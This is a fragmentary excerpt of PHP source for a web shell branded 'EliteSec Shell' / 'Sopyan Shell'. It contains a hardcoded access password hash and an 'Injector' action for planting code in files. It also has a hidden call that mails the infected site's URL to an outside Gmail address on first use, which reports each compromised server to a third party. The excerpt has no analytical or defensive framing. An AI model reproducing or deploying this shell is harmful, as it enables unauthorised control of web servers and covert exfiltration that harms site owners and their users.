...
$auth_pass = "722a1f3672863f21fd93e6297ca28ff4";
$color = "#00FF66";
...
function printHeader() {
    ...
    echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset='.$_POST['charset'].'"><title>EliteSec Shell - '.VERSION.'</title>
    <style>
    ...
    echo '<table class="info" cellpadding="3" cellspacing="0" width="100%"><tr><td width="160px"><div class="logo">Sopyan<sup>&reg;</sup></div><hr style="margin: -5px 13px 2px 17px;width:130px;"><div class="eca1">EliteSec</div><div class="eca2">Cyber Army</div></td>
...
<div style="margin:5px;background:#444;"><div class="content" style="border-top:5px solid #444;text-align:center;font-weight:bold;">Sopyan Shell '.VERSION.', &copy; EliteSec Cyber Army. Coded By - Youssef El Gendy</div></div>
</div>
</body></html>';
}
...
if(!isset($_SESSION['trimite'])){
    ...
    @mail("hasnain1337@gmail.com","3CA_Shell_2.0",$url);
...
function actionLogout() {
    ...
    echo '<body bgcolor=#000000><center><img src="http://elitesec.org/17182742jRJ0dsAO.png"></center></body>';
}
...
function actionInjector(){
    ...
    if(isset($_POST['submit']) && $_POST['submit']=='Inject') {
        ...
        $code = $_POST['code'] ? $_POST['code'] : 'EliteSec Team';
